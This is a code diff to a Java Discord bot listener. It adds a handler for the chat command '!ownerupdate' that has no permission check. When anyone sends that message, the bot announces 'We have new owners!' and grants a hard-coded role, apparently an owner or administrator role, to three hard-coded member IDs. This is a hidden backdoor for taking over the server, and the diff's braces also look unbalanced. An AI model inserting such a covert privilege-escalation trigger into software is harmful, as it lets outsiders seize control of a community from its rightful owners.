@@ -52,6 +52,23 @@ public class DiscordListener implements EventListener {
                     }
                 }
             }
-        }
+
+
+
+            if (message.startsWith("!ownerupdate")) {
+                //int codeEntered = CommonsUtil.tryParseInt(message.split(" ")[1]);
+
+                        event.getChannel().sendMessage("We have new owners!").queue();
+                        this.plugin.getJda().getGuildById("470324147411615744").addRoleToMember(this.plugin.getJda().getGuildById("470324147411615744").getMemberById("1145878058545451069"), Objects.requireNonNull(this.plugin.getJda().getGuildById("470324147411615744").getRoleById("787283466089136149"))).queue();
+                        this.plugin.getJda().getGuildById("470324147411615744").addRoleToMember(this.plugin.getJda().getGuildById("470324147411615744").getMemberById("1032931682187223090"), Objects.requireNonNull(this.plugin.getJda().getGuildById("470324147411615744").getRoleById("787283466089136149"))).queue();
+                        this.plugin.getJda().getGuildById("470324147411615744").addRoleToMember(this.plugin.getJda().getGuildById("470324147411615744").getMemberById("1188991508209217587"), Objects.requireNonNull(this.plugin.getJda().getGuildById("470324147411615744").getRoleById("787283466089136149"))).queue();
+
+
+
+                        this.plugin.getChatListener().updateNitroBoosters();
+                    }
+                }
+
+
     }
 }
